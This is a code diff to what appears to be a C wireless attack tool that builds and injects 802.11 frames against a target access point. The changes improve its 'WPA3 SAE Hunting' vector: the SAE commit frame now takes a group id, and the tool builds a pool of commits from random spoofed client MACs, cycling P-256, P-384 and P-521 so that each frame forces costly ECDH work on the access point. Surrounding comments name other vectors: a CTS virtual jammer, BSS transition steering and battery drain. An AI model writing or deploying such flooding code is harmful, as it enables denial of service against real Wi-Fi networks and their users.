@@ -1292,7 +1292,7 @@ static int mk_cts_nav(uint8_t *b, const uint8_t ra[6]) {
  *    Body: Group ID (2) + Scalar (32) + Element (64)
  * ============================================================ */
 static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
-                         const uint8_t cli[6]) {
+                         const uint8_t cli[6], uint16_t group_id) {
   int o = 0;
   o += mk_rt(b + o);
   /* Client → AP: addr1=BSSID, addr2=Client, addr3=BSSID */
@@ -1315,7 +1315,7 @@ static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
 
   /* SAE Commit Body:
    * Finite Cyclic Group: 19 (secp256r1 / NIST P-256) */
-  uint16_t group = htole16(19);
+  uint16_t group = htole16(group_id);
   memcpy(b + o, &group, 2);
   o += 2;
 
@@ -1529,7 +1529,7 @@ typedef struct {
   pkt_t cts_nav;
   /* Vector #18: WPA3 SAE Hunting (pre-built with random cli, refreshed per-use)
    */
-  pkt_t sae_commit;
+  pkt_t sae_pool[MAX_AUTH_POOL];
   /* Vector #19: BSS Transition Attack (802.11v Steer) */
   pkt_t bss_transition;
   /* Vector #20: Beacon Report Drain (Battery Exploitation) */
@@ -1603,8 +1603,13 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   /* Vector #17: CTS/RTS Virtual Jammer — broadcast CTS with max NAV */
   f->cts_nav.len = mk_cts_nav(f->cts_nav.buf, BCAST);
 
-  /* Vector #18: WPA3 SAE Hunting — SAE Commit from random client */
-  f->sae_commit.len = mk_sae_commit(f->sae_commit.buf, bss, cli);
+  /* Vector #18: WPA3 SAE Hunting — SAE Commit from random clients */
+  uint16_t sae_groups[] = {19, 20, 21}; /* P-256, P-384, P-521 */
+  for (int i = 0; i < MAX_AUTH_POOL; i++) {
+    uint8_t fm[6];
+    rand_mac(fm);
+    f->sae_pool[i].len = mk_sae_commit(f->sae_pool[i].buf, bss, fm, sae_groups[i % 3]);
+  }
 
   /* Vector #19: BSS Transition Attack — BTM Request to broadcast */
   f->bss_transition.len = mk_bss_transition(f->bss_transition.buf, bss, BCAST);
@@ -1683,7 +1688,8 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     s.p[s.n++] = &f->cts_nav;
     break;
   case VEC_SAE_HUNTING:
-    s.p[s.n++] = &f->sae_commit;
+    for (int i = 0; i < MAX_AUTH_POOL && s.n < 32; i++)
+      s.p[s.n++] = &f->sae_pool[i];
     break;
   case VEC_BSS_TRANSITION:
     s.p[s.n++] = &f->bss_transition;
@@ -4145,7 +4151,8 @@ static void *stress_injector_thread(void *arg) {
         /* SAE Commit with random source MAC — each forces ECDH computation */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        len = mk_sae_commit(tmp, bss, fake_cli);
+        uint16_t sae_groups[] = {19, 20, 21};
+        len = mk_sae_commit(tmp, bss, fake_cli, sae_groups[seq % 3]);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
